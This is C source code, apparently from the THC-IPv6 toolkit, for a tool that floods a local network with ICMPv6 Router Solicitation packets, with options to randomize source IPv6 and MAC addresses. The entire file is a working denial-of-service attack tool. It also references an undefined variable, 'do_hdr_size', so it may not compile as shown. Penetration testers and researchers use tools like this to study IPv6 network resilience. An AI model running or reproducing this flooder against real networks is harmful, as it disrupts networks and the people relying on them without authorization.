#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-sS] interface [target]\n\n", prg);
  printf("Flood the local network with ICMPv6 Router Soliciation packets.\n");
  printf(
      "Option -s uses random source IPv6 addresses. Option -S also randomizes "
      "the MAC.\n");
  //  printf("-F/-D/-H add fragment/destination/hopbyhop header to bypass simple
  //  filters\n"); printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface;
  unsigned char  mac[6] = "", *mac6 = mac;
  unsigned char  buf[1460];
  unsigned char *dst = thc_resolve6("ff02::1"), *src = NULL, *dstmac = NULL;
  int i, k, type = NXT_ICMP6, offset = 14, mychecksum, prefer = PREFER_LINK;
  unsigned char *pkt2 = NULL;
  int pkt_len2 = 0, rawmode = 0, count = 0, do_hop = 0, do_frag = 0, do_dst = 0;
  int until = 0, rand_src = 0, rand_mac = 0;
  thc_ipv6_hdr *hdr = NULL;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  while ((i = getopt(argc, argv, "sSDFH")) >= 0) {
    switch (i) {
      case 'F':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      case 's':
        rand_src = 1;
        break;
      case 'S':
        rand_mac = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 1) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[optind];
  if (argc - optind > 1) {
    if ((dst = thc_resolve6(argv[optind + 1])) == NULL) {
      fprintf(stderr, "Error: could not resolve %s\n", argv[optind + 1]);
      exit(-1);
    }
    if (dst[0] >= 0x20 && dst[0] <= 0xfd) prefer = PREFER_GLOBAL;
  }
  dstmac = thc_get_mac(interface, src, dst);
  src = thc_get_own_ipv6(interface, dst, prefer);
  mac6 = thc_get_own_mac(interface);

  if (mac6 == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }

  memset(buf, 0, sizeof(buf));
  buf[0] = 1;
  buf[1] = 1;
  memcpy(buf + 2, mac6, 6);
  i = 8;

  if ((pkt2 = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len2, src,
                                       dst, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt2, &pkt_len2, ICMP6_ROUTERSOL, 0, 0, buf, i, 0) < 0)
    return -1;
  thc_generate_pkt(interface, mac6, dstmac, pkt2, &pkt_len2);
  hdr = (thc_ipv6_hdr *)pkt2;

  k = rand();

  if (do_hdr_size) offset = do_hdr_size;

  printf(
      "Starting to flood with ICMPv6 router solicitation on %s (Press "
      "Control-C to end, a dot is printed for every 1000 packets):\n",
      interface);
  while (until != 1) {
    if (rand_mac) {
      memcpy(hdr->pkt + 8, (char *)&k + _TAKE4, 4);
      memcpy(hdr->pkt + 14 + 40 + 8 + 2 + 2, (char *)&k + _TAKE4, 4);
    }
    if (rand_src) { memcpy(hdr->pkt + 14 + 8 + 8 + 5, (char *)&k + _TAKE3, 3); }
    if (rand_mac || rand_src) {
      hdr->pkt[offset + 42] = 0;
      hdr->pkt[offset + 43] = 0;
      mychecksum = checksum_pseudo_header(
          hdr->pkt + offset + 8, hdr->pkt + offset + 24, NXT_ICMP6,
          hdr->pkt + offset + 40, pkt_len2 - offset - 40);
      hdr->pkt[offset + 42] = mychecksum / 256;
      hdr->pkt[offset + 43] = mychecksum % 256;
      k++;
    }
    count++;
    if (thc_send_pkt(interface, pkt2, &pkt_len2) < 0) { printf("!"); }

    //    usleep(1);
    if (count % 1000 == 0) printf(".");
    if (until > 1) until--;
  }

  return 0;
}
